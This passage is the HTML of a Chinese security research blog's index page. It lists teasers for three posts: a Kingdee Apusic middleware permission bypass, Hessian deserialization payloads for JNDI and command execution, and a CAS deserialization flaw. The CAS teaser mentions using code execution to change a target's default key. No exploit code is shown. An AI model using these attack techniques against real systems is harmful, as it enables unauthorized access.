            <a href="/2023/01/26/%E9%87%91%E8%9D%B6%E5%A4%A9%E7%87%95%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">金蝶天燕权限绕过分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-01-26 00:20:55" itemprop="dateCreated datePublished" datetime="2023-01-26T00:20:55+08:00">2023-01-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-10 00:26:29" itemprop="dateModified" datetime="2024-03-10T00:26:29+08:00">2024-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析了金蝶天燕中间件在安全约束和接口路由获取uri下的差异性导致的权限绕过
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/01/26/%E9%87%91%E8%9D%B6%E5%A4%A9%E7%87%95%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">hessian反序列化</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 18:18:15" itemprop="dateCreated datePublished" datetime="2022-04-09T18:18:15+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-10 00:14:41" itemprop="dateModified" datetime="2024-03-10T00:14:41+08:00">2024-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析了hessian反序列化的原因，构造多种payload来加载字节码、JNDI、命令执行、waf绕过等等
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">cas反序列化漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-09 17:52:12" itemprop="dateCreated datePublished" datetime="2022-03-09T17:52:12+08:00">2022-03-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-10 00:15:43" itemprop="dateModified" datetime="2024-03-10T00:15:43+08:00">2024-03-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析了历史漏洞cas反序列化的原因，通过代码执行修改默认key防止友商进一步利用
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/03/09/cas%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zad"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">zad</p>
  <div class="site-description" itemprop="description">不忘初心,方得始终</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Zbadblog" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Zbadblog" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zad</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
